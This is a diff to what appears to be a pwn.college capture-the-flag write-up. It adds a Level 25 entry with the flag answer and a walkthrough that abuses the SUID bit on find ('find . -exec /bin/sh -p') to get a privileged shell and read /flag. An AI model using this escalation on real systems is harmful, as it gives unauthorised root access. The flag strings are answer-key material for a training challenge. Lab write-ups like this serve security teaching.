@@ -133,6 +133,18 @@ Answer: pwn.college{AUiUyAs5rn99guDsmcLextnwB0i.0lM1EDL0MjM3QzW}
 `echo "}WzQ3MjM0LDE1Ml0.i0BwntxeLcmsDug99nr5sAyUiUA{egelloc.nwp" | rev`
 ```
 
+Level 25 - the SUID bit on /usr/bin/find
+
+Answer: pwn.college{0SWf5DIvyjnM2_ysyw26tcEJuyd.01N2EDL0MjM3QzW}
+
+`find` is to search files and directories. To use the `find` command, I need to specify the directory to search and the criteria for the search.
+
+```bash
+find . -exec /bin/sh -p \;
+# It will show a new shell
+cat /flag
+```
+
 
 
 
